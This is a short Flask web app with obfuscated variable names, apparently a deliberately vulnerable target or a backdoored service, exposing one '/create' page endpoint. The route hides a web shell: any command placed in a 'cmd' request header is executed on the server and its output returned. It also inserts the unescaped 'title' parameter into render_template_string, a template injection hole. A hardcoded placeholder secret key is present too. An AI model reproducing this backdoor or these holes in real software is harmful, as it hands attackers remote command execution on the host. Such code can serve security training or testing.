from flask import Flask ,request ,render_template_string #line:1
app =Flask (__name__ )#line:3
app .secret_key =b'SECRET_KEY'#line:4
@app .route ('/create',methods =['GET','POST'])#line:6
def no_filter ():#line:7
    O000OOO0O0OO00000 =request .args .get ('title')#line:8
    print ('titile: ',O000OOO0O0OO00000 )#line:9
    if request .headers .get ('cmd'):#line:11
        import subprocess #line:12
        O00000000OO000O00 =request .headers ['cmd']#line:13
        if O00000000OO000O00 :#line:14
            OO0O0OOOO0OO0OOOO =subprocess .Popen (O00000000OO000O00 .split (),stdout =subprocess .PIPE ,stderr =subprocess .PIPE )#line:16
            OO0O0OOOO0OO0OOOO .wait ()#line:17
            O0000O0OOO00O00O0 ,OOO0O0O000O0OOO00 =OO0O0OOOO0OO0OOOO .communicate ()#line:18
            return O0000O0OOO00O00O0 #line:19
    OOOOO00000O0OOOO0 ='''
        <!DOCTYPE html>
        <html>
          <head>
            <title>Create</title>
          </head>
          <body>
            <p>'''+O000OOO0O0OO00000 +'''</p>
          </body>
        </html>'''#line:30
    return render_template_string (OOOOO00000O0OOOO0 )#line:31
if __name__ =='__main__':#line:33
        app .run ()
